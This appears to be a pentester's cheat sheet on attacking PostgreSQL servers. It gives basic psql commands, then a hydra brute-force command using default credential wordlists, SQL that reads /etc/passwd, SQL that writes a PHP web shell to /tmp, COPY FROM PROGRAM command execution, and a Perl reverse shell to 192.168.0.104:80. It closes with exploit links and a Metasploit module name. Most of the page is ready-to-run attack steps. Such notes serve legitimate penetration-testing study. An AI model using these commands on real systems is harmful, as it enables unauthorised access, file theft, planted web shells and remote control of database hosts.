# 5432, 5435 - PostgreSQL

## General

{% code overflow="wrap" %}
```sql
https://www.postgresql.org/docs/9.2/functions-info.html

$ psql -h $IP -p $PORT -U $USER                                                                                                                         
# Some basic commands:
\? # help
\c dbname username # to change database on a specified user
\c $DATABASE # change database
\l # list all databases in the current PostgreSQL database server
\dt # list all tables in the current database
\d table_name — describe a table such as a column, type, modifiers of columns, etc.
\dn # list all schemas of the currently connected database
\du # list all users and their assign roles
SELECT version(); # the current version of PostgreSQL server
\g # you want to save time typing the previous command again (but last
#command should be SELECT statement)
\q # exit

# POSTGRESQL VERSION
select version();

# BRUTE FORCE POSTGRESQL
hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt 172.16.242.134 postgres

# READ FILES
create temp table hack(file TEXT);
COPY hack FROM '/etc/passwd';
select * from hack;

# PUTTING A FILE ON THE TARGET
create temp table hack(put TEXT);
INSERT INTO hack(put) VALUES('<?php @system("$_GET[cmd]");?>');
COPY hack(put) TO '/tmp/temp.php';
```
{% endcode %}

## PostgreSQLi

[https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection)

## RCE

<mark style="color:blue;">**From version 9.3**</mark>&#x20;

Since then, new functionality was implemented. This allows the database superuser, and any user in the **pg\_execute\_server\_program** group to run arbitrary operating system commands.

{% code overflow="wrap" %}
```sql
# PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

# Reverse shell (run first two commands above and then this one)
# Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% endcode %}

## References

| Exploit, injection and UDF                                                                                                                                             |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [https://www.exploit-db.com/exploits/50847](https://www.exploit-db.com/exploits/50847)                                                                                 |
| [https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection#rce](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection#rce) |
| [https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1](https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1)     |

## Metasploit

`multi/postgres/postgres_copy_from_program_cmd_exec`
